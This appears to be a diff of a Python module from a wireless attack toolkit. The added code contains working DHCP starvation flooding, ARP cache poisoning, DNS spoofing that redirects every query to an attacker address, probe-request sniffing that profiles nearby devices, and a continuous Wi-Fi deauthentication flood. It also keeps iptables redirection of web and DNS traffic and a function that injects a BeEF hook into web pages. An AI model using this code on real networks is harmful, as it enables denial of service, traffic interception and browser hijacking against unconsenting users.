@@ -15,15 +15,14 @@
 #IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
 #CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 from struct import pack
-from fcntl import ioctl
-from time import sleep,asctime
+from time import sleep,asctime,strftime
 from random import randint
-from os import popen,path,walk,system,getpid
-from BeautifulSoup import BeautifulSoup
+from os import popen,path,walk,system,getpid,stat
 from subprocess import call,check_output,Popen,PIPE,STDOUT
 from re import search,compile,VERBOSE,IGNORECASE
-import socket
 try:
+    from BeautifulSoup import BeautifulSoup
+    from netaddr import EUI
     from nmap import PortScanner
 except ImportError:
     pass
@@ -45,15 +44,18 @@ def airdump_start(interface):
     return None
 
 def Beef_Hook_url(html,hook_url):
-    soup = BeautifulSoup(html)
     try:
-        for link_tag in soup.findAll('body'):
-            link_tag_idx = link_tag.parent.contents.index(link_tag)
-            link_tag.parent.insert(link_tag_idx + 1, BeautifulSoup(hook_url))
-            link_tag.parent.insert(link_tag_idx + 1, BeautifulSoup("<br>"))
-            return soup
-    except:
-        return None
+        soup = BeautifulSoup(html)
+        try:
+            for link_tag in soup.findAll('body'):
+                link_tag_idx = link_tag.parent.contents.index(link_tag)
+                link_tag.parent.insert(link_tag_idx + 1, BeautifulSoup(hook_url))
+                link_tag.parent.insert(link_tag_idx + 1, BeautifulSoup("<br>"))
+                return soup
+        except:
+            return None
+    except NameError:
+        print('[-] please. your need install the module python-BeautifulSoup')
 
 def get_network_scan():
     list_scan = []
@@ -71,29 +73,31 @@ def get_network_scan():
     except IOError:
         return None
 
-
 class ThreadScan(QThread):
     def __init__(self,gateway):
         QThread.__init__(self)
         self.gateway = gateway
         self.result = ''
     def run(self):
-        nm = PortScanner()
-        a=nm.scan(hosts=self.gateway, arguments='-sU --script nbstat.nse -O -p137')
-        for k,v in a['scan'].iteritems():
-            if str(v['status']['state']) == 'up':
-                try:
-                    ip = str(v['addresses']['ipv4'])
-                    hostname = str(v['hostscript'][0]['output']).split(',')[0]
-                    hostname = hostname.split(':')[1]
-                    mac = str(v['hostscript'][0]['output']).split(',')[2]
-                    if search('<unknown>',mac):mac = '<unknown>'
-                    else:mac = mac[13:32]
-                    self.result = ip +'|'+mac.replace('\n','')+'|'+hostname.replace('\n','')
-                    self.emit(SIGNAL('Activated( QString )'),
-                    self.result)
-                except :
-                    pass
+        try:
+            nm = PortScanner()
+            a=nm.scan(hosts=self.gateway, arguments='-sU --script nbstat.nse -O -p137')
+            for k,v in a['scan'].iteritems():
+                if str(v['status']['state']) == 'up':
+                    try:
+                        ip = str(v['addresses']['ipv4'])
+                        hostname = str(v['hostscript'][0]['output']).split(',')[0]
+                        hostname = hostname.split(':')[1]
+                        mac = str(v['hostscript'][0]['output']).split(',')[2]
+                        if search('<unknown>',mac):mac = '<unknown>'
+                        else:mac = mac[13:32]
+                        self.result = ip +'|'+mac.replace('\n','')+'|'+hostname.replace('\n','')
+                        self.emit(SIGNAL('Activated( QString )'),
+                        self.result)
+                    except :
+                        pass
+        except NameError:
+            QMessageBox.information(self,'error module','the module Python-nmap not installed')
 
 class set_monitor_mode(QDialog):
     def __init__(self,interface,parent = None):
@@ -146,23 +150,108 @@ class ProcessThread(threading.Thread):
             self.process.terminate()
             self.process = None
 
-class ThARP_posion(threading.Thread):
-    def __init__(self, srcAddress, dstAddress):
-        threading.Thread.__init__(self)
+class ThreadAttackStar(QThread):
+    def __init__(self,interface):
+        QThread.__init__(self)
+        self.interface = interface
+        self.process = True
+
+    def run(self):
+        print "Starting Thread:" + self.objectName()
+        self.count = 0
+        while self.process:
+            conf.checkIPaddr = False
+            dhcp_discover =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")\
+                /IP(src="0.0.0.0",dst="255.255.255.255")\
+                /UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))\
+            /DHCP(options=[("message-type","discover"),"end"])
+            sendp(dhcp_discover)
+            self.count += 1
+            self.data = ("PacketSend:[%s] DISCOVER Interface: %s "%(self.count,self.interface)
+                         + strftime("%c"))
+            self.emit(SIGNAL("Activated( QString )"),self.data.rstrip())
+        self.emit(SIGNAL("Activated( QString )"),"[ OFF ] Packet sent: " + str(self.count))
+    def stop(self):
+        print "Stop thread:" + self.objectName()
+        self.process = False
+
+
+
+class ThARP_posion(QThread):
+    def __init__(self,srcAddress,dstAddress,mac):
+        QThread.__init__(self)
         self.srcAddress = srcAddress
         self.dstAddress = dstAddress
-        self.process = True
+        self.mac        = mac
+        self.process    = True
+
+    def makePacket(self):
+        ether = Ether(dst = 'ff:ff:ff:ff:ff:ff',src = self.mac)
+        parp  = ARP(hwtype = 0x1,ptype = 0x800,hwlen = 0x6,plen = 0x4,
+        op = "is-at",hwsrc = self.mac,psrc = self.srcAddress,hwdst =
+        'ff:ff:ff:ff:ff:ff',pdst = self.dstAddress)
+        padding = Padding(load = "\x00"*18)
+        packet_arp= ether/parp/padding
+        return packet_arp
+
     def run(self):
+        print 'Starting Thread:' + self.objectName()
+        pkt = self.makePacket()
         while self.process:
-            send(ARP(op=2,
-            pdst=self.dstAddress,
-                    psrc=self.srcAddress),
-                            verbose=False,count=3)
+            sendp(pkt,verbose=False)
+            sleep(2)
+
     def stop(self):
         self.process = False
-        print 'Stop thread:' + self.name
+        print 'Stop thread:' + self.objectName()
+        self.emit(SIGNAL('Activated( QString )'),'Ok')
 
-class ThDnsSpoofAttack(QThread):
+
+class ThreadProbeScan(QThread):
+    def __init__(self,interface):
+        QThread.__init__(self)
+        self.interface  = interface
+        self.finished   = False
+
+    def run(self):
+        print "Starting Thread:" + self.objectName()
+        self.ProbeResqest()
+    def Startprobe(self,q):
+        while not self.finished:
+            try:
+                sniff(iface = self.interface,count = 10, prn = lambda x : q.put(x))
+            except:pass
+            if self.finished:break
+
+    def ProbeResqest(self):
+        q = Queue()
+        sniff = Thread(target =self.Startprobe, args = (q,))
+        sniff.daemon = True
+        sniff.start()
+        while (not self.finished):
+            try:
+                pkt = q.get(timeout = 1)
+                self.sniff_probe(pkt)
+            except Empty:
+              pass
+    def sniff_probe(self,p):
+        if (p.haslayer(Dot11ProbeReq)):
+                mac_address=(p.addr2)
+                ssid=p[Dot11Elt].info
+                ssid=ssid.decode('utf-8','ignore')
+                if ssid == '':ssid='Hidden'
+                try:
+                    devices = EUI(mac_address)
+                    devices = devices.oui.registration().org
+                except:
+                    devices = 'unknown device'
+                self.emit(SIGNAL("Activated( QString )"),mac_address + '|'+ssid +'|'+devices)
+
+    def stop(self):
+        print "Stop thread:" + self.objectName()
+        self.finished = True
+
+class ThSpoofAttack(QThread):
     def __init__(self,domains,interface,filter,verbose,redirect):
         QThread.__init__(self)
         self.target     = domains
@@ -171,22 +260,26 @@ class ThDnsSpoofAttack(QThread):
         self.interface  = interface
         self.redirect   = redirect
         self.finished   = False
-        self.desc       = ['Module DNS spoof Attack']
+        self.mac        = get_if_hwaddr(self.interface)
+        self.desc       = ['Module DNS spoof']
 
     def run(self):
         print 'Starting Thread:' + self.objectName()
         self.sniff()
 
     def ARP(self,target,gateway):
+        ether = Ether(dst = 'ff:ff:ff:ff:ff:ff',src = self.mac)
+        parp  = ARP(hwtype = 0x1,ptype = 0x800,hwlen = 0x6,plen = 0x4,
+        op = 'is-at',hwsrc = self.mac,psrc = gateway,hwdst =
+        'ff:ff:ff:ff:ff:ff',pdst = target)
+        padding = Padding(load = "\x00"*18)
+        packet_arp= ether/parp/padding
         while True:
             try:
-                send(ARP(op=2,
-                pdst=target,
-                    psrc=gateway),
-                        verbose=False, count=3)
-                send(ARP(op=2,
-                        pdst=gateway,
-                psrc=target), verbose=False, count=3)
+                sendp(packet_arp,
+                verbose=False, count=3)
+                send(packet_arp,
+                verbose=False, count=3)
             except:
                 pass
 
@@ -208,7 +301,6 @@ class ThDnsSpoofAttack(QThread):
               pass
 
     def Poisoning(self,packet):
-        #this function coded by:Adastra
         #https://github.com/Adastra-thw/pyHacks/blob/master/MitmDnsSpoofingPoC.py
         if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0 and len(self.target) > 0:
             for targetDomain, ipAddressTarget in self.target.items():
@@ -226,18 +318,32 @@ class ThDnsSpoofAttack(QThread):
                         send(answer)
                     except:
                         pass
+        elif packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0 and len(self.target) == 0:
+            try:
+                requestIP = packet[IP]
+                requestUDP = packet[UDP]
+                requestDNS = packet[DNS]
+                requestDNSQR = packet[DNSQR]
+                responseIP = IP(src=requestIP.dst, dst=requestIP.src)
+                responseUDP = UDP(sport = requestUDP.dport, dport = requestUDP.sport)
+                responseDNSRR = DNSRR(rrname=packet.getlayer(DNS).qd.qname, rdata = self.redirect)
+                responseDNS = DNS(qr=1,id=requestDNS.id, qd=requestDNSQR, an=responseDNSRR)
+                answer = responseIP/responseUDP/responseDNS
+                send(answer)
+            except Exception:
+                pass
     def redirection(self):
-        system("iptables --flush")
-        system("iptables --zero")
-        system("iptables --delete-chain")
-        system("iptables -F -t nat")
+        system('iptables --flush')
+        system('iptables --zero')
+        system('iptables --delete-chain')
+        system('iptables -F -t nat')
         system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
-        system("iptables --append FORWARD --in-interface "+self.interface+" --jump ACCEPT")
-        system("iptables --table nat --append POSTROUTING --out-interface "+self.interface+" --jump MASQUERADE")
-        system("iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination "+self.redirect)
-        system("iptables -t nat -A PREROUTING -p tcp --dport 443 --jump DNAT --to-destination "+self.redirect)
-        system("iptables -t nat -A PREROUTING -i "+self.interface+" -p udp --dport 53 -j DNAT --to "+self.redirect)
-        system("iptables -t nat -A PREROUTING -i "+self.interface+" -p tcp --dport 53 -j DNAT --to "+self.redirect)
+        system('iptables --append FORWARD --in-interface '+self.interface+' --jump ACCEPT')
+        system('iptables --table nat --append POSTROUTING --out-interface '+self.interface+' --jump MASQUERADE')
+        system('iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination '+self.redirect)
+        system('iptables -t nat -A PREROUTING -p tcp --dport 443 --jump DNAT --to-destination '+self.redirect)
+        system('iptables -t nat -A PREROUTING -i '+self.interface+' -p udp --dport 53 -j DNAT --to '+self.redirect)
+        system('iptables -t nat -A PREROUTING -i '+self.interface+' -p tcp --dport 53 -j DNAT --to '+self.redirect)
 
     def stop(self):
         print 'Stop Thread:' + self.objectName()
@@ -330,6 +436,19 @@ class Refactor:
         return ':'.join(['%02x' % ord(char) for char in info[18:24]])
 
     @staticmethod
+    def deauth(bssid, client,interface):
+        conf.verb = 0
+        conf.iface = interface
+        pkts = []
+        pkt1 = RadioTap()/Dot11(type=0,subtype=12,addr1=client,
+        addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
+        pkt2 = Dot11(addr1=bssid, addr2=client,
+        addr3=client)/Dot11Deauth()
+        pkts.append(pkt1),pkts.append(pkt2)
+        while True:
+            for x in pkts:sendp(x,verbose=False,count=1)
+
+    @staticmethod
     def get_interfaces():
         interfaces = {'activated':None,'all':[],'gateway':None,'IPaddress':None}
         proc = Popen("ls -1 /sys/class/net",stdout=PIPE, shell=True)
@@ -342,11 +461,11 @@ class Refactor:
             elif output2 != []:
                 if path.isfile('/sbin/ip'):
                     interfaces['gateway'],interfaces['activated'] = output2[2], output2[4]
-            interfaces['IPaddress'] = Refactor.get_ip_local(interfaces['activated'])
+            interfaces['IPaddress'] = Refactor.get_Ipaddr(interfaces['activated'])
         return interfaces
 
     @staticmethod
-    def get_ip_local(card):
+    def get_Ipaddr(card):
         if not card != None:
             get_interface = Refactor.get_interfaces()['activated']
             out = popen("ifconfig %s | grep 'Bcast'"%(get_interface)).read().split()
@@ -368,7 +487,7 @@ class Refactor:
             if len(out) > 0:
                 ip = out[1].split(":")
                 return ip[1]
-        return None
+        return '0.0.0.0'
 
     @staticmethod
     def get_mac(host):
@@ -415,6 +534,10 @@ class Refactor:
         for root, dirs, files in walk(paths):
             if name in files:
                 return path.join(root, name)
+    @staticmethod
+    def getSize(filename):
+        st = stat(filename)
+        return st.st_size
 
 class waiter(threading.Thread):
     def run(self):
